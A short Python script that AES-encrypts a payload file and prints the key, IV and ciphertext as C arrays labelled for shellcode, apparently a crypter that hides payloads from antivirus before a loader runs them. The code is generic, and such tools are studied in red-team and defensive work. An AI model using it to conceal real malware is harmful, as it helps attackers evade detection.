import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom
import hashlib

def AESencrypt(plaintext, key, iv):
    k = hashlib.sha256(key).digest()  # Derive a 32-byte key using SHA-256
    print(f"Derived Key: {k.hex()}")  
    
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)  # Use the passed IV
    ciphertext = cipher.encrypt(plaintext)
    
    return ciphertext

def printResult(key, iv, ciphertext):
    print('unsigned char AESkey[] = { ' + ', '.join(f'0x{hex(x)[2:]}' for x in key) + ' };')
    print('unsigned char AESiv[] = { ' + ', '.join(f'0x{hex(x)[2:]}' for x in iv) + ' };')
    print('unsigned char AESshellcode[] = { ' + ', '.join(f'0x{hex(x)[2:]}' for x in ciphertext) + ' };')
    print(f"Ciphertext length: {len(ciphertext)}")
    print(f"Key length: {len(key)}")
    print(f"IV length: {len(iv)}")

try:
    with open(sys.argv[1], "rb") as file:
        content = file.read()
except IndexError:
    print("Usage: ./AES_cryptor.py PAYLOAD_FILE")
    sys.exit()
except FileNotFoundError:
    print("Error: File not found.")
    sys.exit()

KEY = urandom(16)  # Generate a random 16-byte key
IV = urandom(16)   # Generate a random 16-byte IV

ciphertext = AESencrypt(content, KEY, IV)
printResult(KEY, IV, ciphertext)
